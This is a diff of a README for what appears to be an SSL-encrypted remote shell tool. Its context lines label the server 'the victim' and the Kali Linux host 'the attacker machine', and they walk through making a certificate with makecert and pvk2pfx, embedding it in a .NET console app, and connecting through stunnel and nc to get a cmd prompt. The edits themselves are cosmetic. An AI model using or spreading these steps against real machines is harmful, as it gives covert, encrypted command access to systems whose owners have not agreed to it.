@@ -12,7 +12,7 @@ For the server side (the victim)
    >makecert.exe -r -pe -n "CN=localhost" -sky exchange -sv server.pvk server.cer
    1. enter required password, then execute: 
    >pvk2pfx -pvk server.pvk -spc server.cer -pfx server.pfx
-   1. Enter required server password
+   1. enter required server password
 1. include the Server.pfx as resource in your VS project (console app) and set the Copy to the output directory as Copy. Eventually you can embed the certificate and load it at runtime, more info:<br/>https://stackoverflow.com/questions/3314140/how-to-read-embedded-resource-text-file, so you will have to deploy a single file.
 <br/>	
 In our attacker machine (Kali Linux) we will use stunnel (since the server require SSL) in conjunction with nc
@@ -31,7 +31,9 @@ In our attacker machine (Kali Linux) we will use stunnel (since the server requi
 	>service stunnel4 start
 		
 1. check if it's running (optional)
+	
 	>netstat -tulp
+	
 	the output should be similar to:
 	>Active Internet connections (only servers)
 	>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
@@ -42,11 +44,3 @@ In our attacker machine (Kali Linux) we will use stunnel (since the server requi
 	>nc localhost 8443
 	
 1. you should get a cmd prompt
-	
-
-
-	
-
-
-
-![...](img/shel_ssl.png?raw=true)
